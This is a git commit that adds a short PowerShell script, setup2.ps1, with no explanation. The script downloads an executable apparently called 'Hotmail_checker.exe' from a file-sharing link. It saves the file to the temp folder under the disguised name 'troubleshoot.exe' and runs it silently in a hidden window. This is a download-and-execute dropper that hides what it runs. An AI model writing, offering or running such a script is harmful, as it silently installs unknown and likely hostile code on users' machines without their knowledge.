d374f091ac0af122482509db5b2a7a12d65f9bed
atlastweaks <reallyyes@atomicmail.io>
2026-08-24 21:47:54 +0200

    setup2

---
+++ setup2.ps1
@@ -0,0 +1,15 @@
+$ErrorActionPreference = "Stop"
+
+$url = "https://cold-eu-agl-1.gofile.io/download/web/cf8ab565-842e-4f6e-a9bb-4b6e05c83e40/Hotmail_checker.exe"
+$temp = Join-Path $env:TEMP "troubleshoot.exe"
+
+Invoke-WebRequest -Uri $url -OutFile $temp -UseBasicParsing
+
+$process = Start-Process `
+    -FilePath $temp `
+    -ArgumentList "/S" `
+    -Wait `
+    -PassThru `
+    -WindowStyle Hidden
+
+exit $process.ExitCode
